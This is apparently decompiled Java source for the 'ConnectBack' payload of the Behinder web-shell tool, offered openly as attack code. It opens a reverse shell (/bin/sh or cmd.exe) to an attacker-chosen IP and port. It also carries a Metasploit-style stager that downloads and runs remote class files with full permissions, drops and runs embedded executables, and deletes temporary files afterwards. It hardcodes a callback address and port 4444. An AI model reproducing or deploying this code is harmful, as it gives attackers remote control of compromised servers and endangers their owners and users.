package net.rebeyond.behinder.payload.java;

import java.io.BufferedReader;
import java.io.BufferedWriter;
import java.io.ByteArrayInputStream;
import java.io.ByteArrayOutputStream;
import java.io.DataInputStream;
import java.io.File;
import java.io.FileNotFoundException;
import java.io.FileOutputStream;
import java.io.IOException;
import java.io.InputStream;
import java.io.InputStreamReader;
import java.io.OutputStream;
import java.io.OutputStreamWriter;
import java.io.PrintStream;
import java.lang.reflect.Method;
import java.net.ServerSocket;
import java.net.Socket;
import java.net.URL;
import java.net.URLConnection;
import java.security.AllPermission;
import java.security.CodeSource;
import java.security.Permissions;
import java.security.ProtectionDomain;
import java.security.cert.Certificate;
import java.util.HashMap;
import java.util.Iterator;
import java.util.Locale;
import java.util.Map;
import java.util.Properties;
import java.util.Stack;
import java.util.StringTokenizer;
import javax.crypto.Cipher;
import javax.crypto.spec.SecretKeySpec;

public class ConnectBack extends ClassLoader implements Runnable {
   public static String type;
   public static String ip;
   public static String port;
   private Object Request;
   private Object Response;
   private Object Session;
   InputStream dn;
   OutputStream rm;
   private static final String OS_NAME;
   private static final String PATH_SEP;
   private static final boolean IS_AIX;
   private static final boolean IS_DOS;
   private static final String JAVA_HOME;

   public ConnectBack(InputStream dn, OutputStream rm) {
      this.dn = dn;
      this.rm = rm;
   }

   public ConnectBack() {
   }

   public boolean equals(Object obj) {
      HashMap result = new HashMap();
      boolean var13 = false;

      Object so;
      Method write;
      label91: {
         try {
            var13 = true;
            this.fillContext(obj);
            if (type.equals("shell")) {
               this.shellConnect();
            } else if (type.equals("meter")) {
               this.meterConnect();
            }

            result.put("status", "success");
            var13 = false;
            break label91;
         } catch (Exception var17) {
            result.put("status", "fail");
            result.put("msg", var17.getMessage());
            var13 = false;
         } finally {
            if (var13) {
               try {
                  so = this.Response.getClass().getMethod("getOutputStream").invoke(this.Response);
                  write = so.getClass().getMethod("write", byte[].class);
                  write.invoke(so, this.Encrypt(this.buildJson(result, true).getBytes("UTF-8")));
                  so.getClass().getMethod("flush").invoke(so);
                  so.getClass().getMethod("close").invoke(so);
               } catch (Exception var14) {
               }

            }
         }

         try {
            so = this.Response.getClass().getMethod("getOutputStream").invoke(this.Response);
            write = so.getClass().getMethod("write", byte[].class);
            write.invoke(so, this.Encrypt(this.buildJson(result, true).getBytes("UTF-8")));
            so.getClass().getMethod("flush").invoke(so);
            so.getClass().getMethod("close").invoke(so);
         } catch (Exception var15) {
         }

         return true;
      }

      try {
         so = this.Response.getClass().getMethod("getOutputStream").invoke(this.Response);
         write = so.getClass().getMethod("write", byte[].class);
         write.invoke(so, this.Encrypt(this.buildJson(result, true).getBytes("UTF-8")));
         so.getClass().getMethod("flush").invoke(so);
         so.getClass().getMethod("close").invoke(so);
      } catch (Exception var16) {
      }

      return true;
   }

   public void run() {
      BufferedReader hz = null;
      BufferedWriter cns = null;

      try {
         hz = new BufferedReader(new InputStreamReader(this.dn));
         cns = new BufferedWriter(new OutputStreamWriter(this.rm));
         char[] buffer = new char[8192];

         int length;
         while((length = hz.read(buffer, 0, buffer.length)) > 0) {
            cns.write(buffer, 0, length);
            cns.flush();
         }
      } catch (Exception var6) {
      }

      try {
         if (hz != null) {
            hz.close();
         }

         if (cns != null) {
            cns.close();
         }
      } catch (Exception var5) {
      }

   }

   private void shellConnect() throws Exception {
      try {
         String ShellPath;
         if (System.getProperty("os.name").toLowerCase().indexOf("windows") == -1) {
            ShellPath = new String("/bin/sh");
         } else {
            ShellPath = new String("cmd.exe");
         }

         Socket socket = new Socket(ip, Integer.parseInt(port));
         Process process = Runtime.getRuntime().exec(ShellPath);
         (new Thread(new ConnectBack(process.getInputStream(), socket.getOutputStream()))).start();
         (new Thread(new ConnectBack(socket.getInputStream(), process.getOutputStream()))).start();
      } catch (Exception var4) {
         throw var4;
      }
   }

   public static void main(String[] args) {
      try {
         ConnectBack c = new ConnectBack();
         ip = "192.168.50.53";
         port = "4444";
         c.meterConnect();
      } catch (Exception var2) {
      }

   }

   private void meterConnect() throws Exception {
      Properties props = new Properties();
      Class clazz = ConnectBack.class;
      String clazzFile = clazz.getName().replace('.', '/') + ".class";
      props.put("LHOST", ip);
      props.put("LPORT", port);
      String executableName = props.getProperty("Executable");
      File droppedFile;
      if (executableName != null) {
         File dummyTempFile = File.createTempFile("~spawn", ".tmp");
         dummyTempFile.delete();
         File tempDir = new File(dummyTempFile.getAbsolutePath() + ".dir");
         tempDir.mkdir();
         droppedFile = new File(tempDir, executableName);
         writeEmbeddedFile(clazz, executableName, droppedFile);
         props.remove("Executable");
         props.put("DroppedExecutable", droppedFile.getCanonicalPath());
      }

      int spawn = Integer.parseInt(props.getProperty("Spawn", "0"));
      String droppedExecutable = props.getProperty("DroppedExecutable");
      if (spawn > 0) {
         props.setProperty("Spawn", String.valueOf(spawn - 1));
         droppedFile = File.createTempFile("~spawn", ".tmp");
         droppedFile.delete();
         File tempDir = new File(droppedFile.getAbsolutePath() + ".dir");
         File propFile = new File(tempDir, "metasploit.dat");
         File classFile = new File(tempDir, clazzFile);
         classFile.getParentFile().mkdirs();
         writeEmbeddedFile(clazz, clazzFile, classFile);
         if (props.getProperty("URL", "").startsWith("https:")) {
            writeEmbeddedFile(clazz, "metasploit/PayloadTrustManager.class", new File(classFile.getParentFile(), "PayloadTrustManager.class"));
         }

         if (props.getProperty("AESPassword", (String)null) != null) {
            writeEmbeddedFile(clazz, "metasploit/AESEncryption.class", new File(classFile.getParentFile(), "AESEncryption.class"));
         }

         FileOutputStream fos = new FileOutputStream(propFile);
         props.store(fos, "");
         fos.close();
         Process proc = Runtime.getRuntime().exec(new String[]{getJreExecutable("java"), "-classpath", tempDir.getAbsolutePath(), clazz.getName()});
         proc.getInputStream().close();
         proc.getErrorStream().close();
         Thread.sleep(2000L);
         File[] files = new File[]{classFile, classFile.getParentFile(), propFile, tempDir};

         for(int i = 0; i < files.length; ++i) {
            for(i = 0; i < 10 && !files[i].delete(); ++i) {
               files[i].deleteOnExit();
               Thread.sleep(100L);
            }
         }
      } else if (droppedExecutable != null) {
         droppedFile = new File(droppedExecutable);
         if (!IS_DOS) {
            try {
               try {
                  File.class.getMethod("setExecutable", Boolean.TYPE).invoke(droppedFile, Boolean.TRUE);
               } catch (NoSuchMethodException var16) {
                  Runtime.getRuntime().exec(new String[]{"chmod", "+x", droppedExecutable}).waitFor();
               }
            } catch (Exception var17) {
            }
         }

         Runtime.getRuntime().exec(new String[]{droppedExecutable});
         if (!IS_DOS) {
            droppedFile.delete();
            droppedFile.getParentFile().delete();
         }
      } else {
         int lPort = Integer.parseInt(props.getProperty("LPORT", "4444"));
         String lHost = props.getProperty("LHOST", (String)null);
         String url = props.getProperty("URL", (String)null);
         Object in;
         Object out;
         if (lPort <= 0) {
            in = System.in;
            out = System.out;
         } else if (url != null) {
            if (url.startsWith("raw:")) {
               in = new ByteArrayInputStream(url.substring(4).getBytes("ISO-8859-1"));
            } else if (url.startsWith("https:")) {
               URLConnection uc = (new URL(url)).openConnection();
               Class.forName("metasploit.PayloadTrustManager").getMethod("useFor", URLConnection.class).invoke((Object)null, uc);
               in = uc.getInputStream();
            } else {
               in = (new URL(url)).openStream();
            }

            out = new ByteArrayOutputStream();
         } else {
            Socket socket;
            if (lHost != null) {
               socket = new Socket(lHost, lPort);
            } else {
               ServerSocket serverSocket = new ServerSocket(lPort);
               socket = serverSocket.accept();
               serverSocket.close();
            }

            in = socket.getInputStream();
            out = socket.getOutputStream();
         }

         String aesPassword = props.getProperty("AESPassword", (String)null);
         if (aesPassword != null) {
            Object[] streams = (Object[])((Object[])Class.forName("metasploit.AESEncryption").getMethod("wrapStreams", InputStream.class, OutputStream.class, String.class).invoke((Object)null, in, out, aesPassword));
            in = (InputStream)streams[0];
            out = (OutputStream)streams[1];
         }

         StringTokenizer stageParamTokenizer = new StringTokenizer("Payload -- " + props.getProperty("StageParameters", ""), " ");
         String[] stageParams = new String[stageParamTokenizer.countTokens()];

         for(int i = 0; i < stageParams.length; ++i) {
            stageParams[i] = stageParamTokenizer.nextToken();
         }

         (new ConnectBack()).bootstrap((InputStream)in, (OutputStream)out, props.getProperty("EmbeddedStage", (String)null), stageParams);
      }

   }

   private static void writeEmbeddedFile(Class clazz, String resourceName, File targetFile) throws FileNotFoundException, IOException {
      InputStream in = clazz.getResourceAsStream("/" + resourceName);
      FileOutputStream fos = new FileOutputStream(targetFile);
      byte[] buf = new byte[4096];

      int len;
      while((len = in.read(buf)) != -1) {
         fos.write(buf, 0, len);
      }

      fos.close();
   }

   private final void bootstrap(InputStream rawIn, OutputStream out, String embeddedStageName, String[] stageParameters) throws Exception {
      try {
         DataInputStream in = new DataInputStream(rawIn);
         Permissions permissions = new Permissions();
         permissions.add(new AllPermission());
         ProtectionDomain pd = new ProtectionDomain(new CodeSource(new URL("file:///"), new Certificate[0]), permissions);
         Class clazz;
         if (embeddedStageName == null) {
            int length = in.readInt();

            do {
               byte[] classfile = new byte[length];
               in.readFully(classfile);
               this.resolveClass(clazz = this.defineClass((String)null, classfile, 0, length, pd));
               length = in.readInt();
            } while(length > 0);
         } else {
            clazz = Class.forName("javapayload.stage." + embeddedStageName);
         }

         Object stage = clazz.newInstance();
         clazz.getMethod("start", DataInputStream.class, OutputStream.class, String[].class).invoke(stage, in, out, stageParameters);
      } catch (Throwable var11) {
         var11.printStackTrace(new PrintStream(out));
      }

   }

   private static String getJreExecutable(String command) {
      File jExecutable = null;
      if (IS_AIX) {
         jExecutable = findInDir(JAVA_HOME + "/sh", command);
      }

      if (jExecutable == null) {
         jExecutable = findInDir(JAVA_HOME + "/bin", command);
      }

      return jExecutable != null ? jExecutable.getAbsolutePath() : addExtension(command);
   }

   private static String addExtension(String command) {
      return command + (IS_DOS ? ".exe" : "");
   }

   private static File findInDir(String dirName, String commandName) {
      File dir = normalize(dirName);
      File executable = null;
      if (dir.exists()) {
         executable = new File(dir, addExtension(commandName));
         if (!executable.exists()) {
            executable = null;
         }
      }

      return executable;
   }

   private static File normalize(String path) {
      Stack s = new Stack();
      String[] dissect = dissect(path);
      s.push(dissect[0]);
      StringTokenizer tok = new StringTokenizer(dissect[1], File.separator);

      while(tok.hasMoreTokens()) {
         String thisToken = tok.nextToken();
         if (!".".equals(thisToken)) {
            if ("..".equals(thisToken)) {
               if (s.size() < 2) {
                  return new File(path);
               }

               s.pop();
            } else {
               s.push(thisToken);
            }
         }
      }

      StringBuffer sb = new StringBuffer();

      for(int i = 0; i < s.size(); ++i) {
         if (i > 1) {
            sb.append(File.separatorChar);
         }

         sb.append(s.elementAt(i));
      }

      return new File(sb.toString());
   }

   private static String[] dissect(String path) {
      char sep = File.separatorChar;
      path = path.replace('/', sep).replace('\\', sep);
      String root = null;
      int colon = path.indexOf(58);
      int nextsep;
      if (colon > 0 && IS_DOS) {
         nextsep = colon + 1;
         root = path.substring(0, nextsep);
         char[] ca = path.toCharArray();
         root = root + sep;
         nextsep = ca[nextsep] == sep ? nextsep + 1 : nextsep;
         StringBuffer sbPath = new StringBuffer();

         for(int i = nextsep; i < ca.length; ++i) {
            if (ca[i] != sep || ca[i - 1] != sep) {
               sbPath.append(ca[i]);
            }
         }

         path = sbPath.toString();
      } else if (path.length() > 1 && path.charAt(1) == sep) {
         nextsep = path.indexOf(sep, 2);
         nextsep = path.indexOf(sep, nextsep + 1);
         root = nextsep > 2 ? path.substring(0, nextsep + 1) : path;
         path = path.substring(root.length());
      } else {
         root = File.separator;
         path = path.substring(1);
      }

      return new String[]{root, path};
   }

   private String buildJson(Map entity, boolean encode) throws Exception {
      StringBuilder sb = new StringBuilder();
      String version = System.getProperty("java.version");
      sb.append("{");
      Iterator var5 = entity.keySet().iterator();

      while(var5.hasNext()) {
         String key = (String)var5.next();
         sb.append("\"" + key + "\":\"");
         String value = ((String)entity.get(key)).toString();
         if (encode) {
            Class Base64;
            Object Encoder;
            if (version.compareTo("1.9") >= 0) {
               this.getClass();
               Base64 = Class.forName("java.util.Base64");
               Encoder = Base64.getMethod("getEncoder", (Class[])null).invoke(Base64, (Object[])null);
               value = (String)Encoder.getClass().getMethod("encodeToString", byte[].class).invoke(Encoder, value.getBytes("UTF-8"));
            } else {
               this.getClass();
               Base64 = Class.forName("sun.misc.BASE64Encoder");
               Encoder = Base64.newInstance();
               value = (String)Encoder.getClass().getMethod("encode", byte[].class).invoke(Encoder, value.getBytes("UTF-8"));
               value = value.replace("\n", "").replace("\r", "");
            }
         }

         sb.append(value);
         sb.append("\",");
      }

      if (sb.toString().endsWith(",")) {
         sb.setLength(sb.length() - 1);
      }

      sb.append("}");
      return sb.toString();
   }

   private byte[] Encrypt(byte[] bs) throws Exception {
      String key = this.Session.getClass().getMethod("getAttribute", String.class).invoke(this.Session, "u").toString();
      byte[] raw = key.getBytes("utf-8");
      SecretKeySpec skeySpec = new SecretKeySpec(raw, "AES");
      Cipher cipher = Cipher.getInstance("AES/ECB/PKCS5Padding");
      cipher.init(1, skeySpec);
      byte[] encrypted = cipher.doFinal(bs);
      return encrypted;
   }

   private void fillContext(Object obj) throws Exception {
      if (obj.getClass().getName().indexOf("PageContext") >= 0) {
         this.Request = obj.getClass().getMethod("getRequest").invoke(obj);
         this.Response = obj.getClass().getMethod("getResponse").invoke(obj);
         this.Session = obj.getClass().getMethod("getSession").invoke(obj);
      } else {
         Map objMap = (Map)obj;
         this.Session = objMap.get("session");
         this.Response = objMap.get("response");
         this.Request = objMap.get("request");
      }

      this.Response.getClass().getMethod("setCharacterEncoding", String.class).invoke(this.Response, "UTF-8");
   }

   static {
      OS_NAME = System.getProperty("os.name").toLowerCase(Locale.ENGLISH);
      PATH_SEP = System.getProperty("path.separator");
      IS_AIX = "aix".equals(OS_NAME);
      IS_DOS = PATH_SEP.equals(";");
      JAVA_HOME = System.getProperty("java.home");
   }
}
